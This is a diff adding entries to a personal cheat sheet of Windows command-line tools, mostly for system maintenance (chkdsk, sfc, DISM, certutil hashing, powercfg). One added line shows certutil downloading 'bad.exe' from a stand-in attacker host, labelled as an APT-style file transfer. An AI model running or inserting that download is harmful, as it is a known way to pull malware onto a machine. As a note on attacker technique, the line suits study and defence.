@@ -1,13 +1,35 @@
 # cmd.exe - cli
 
 ```powershell
+assoc # File association 
+assoc .filetype=APP # set default application to open/use file type 
+
+chkdsk
+chkdsk /r # restart
+
+sfc # system file check, replaces and fixes broken files.
+
+# Image maintaince and restoration
+DISM /Online /Cleanup-Image /ScanHealth
+DISM /Online /Cleanup-Image /Restore
+
 $driveletter:		change drive!
 
+# Stdout printing 
 echo use the streams > file.txt:<stream> 	create secondary data stream, use dir /R to see alternate data streams
 		     < file.txt:<stream>	pass the stream of file.txt to ..
 
+# certutil 
 certutil -hashfile file <digest name e.g. sha256>
+certutil -urlcache -split -f http://attacker-ip/bad.exe # file transfer an APT way
+certutil -hashfile \FULLPATH\ [EncryptionMethod] # Checksum a file
 
+| clip # copy to clipboard
+
+cls # Clear screen
+
+
+powercfg /batteryreport
 
 systeminfo
 
@@ -139,7 +161,10 @@ sc config <svc> *=	Set configuration of a service see /? for type of configurati
 taskkill 
 	/PID int
 
-
-# Checksum a file
-Certutil -hashfile \FULLPATH\ [EncryptionMethod]
+# Retart to system bios without touching a hotkey!
+shutdown /r /fw /f /t 0
 ```
+
+## References
+
+[Networkchuck top 40 CLI video](https://www.youtube.com/watch?v=Jfvg3CS1X3A)
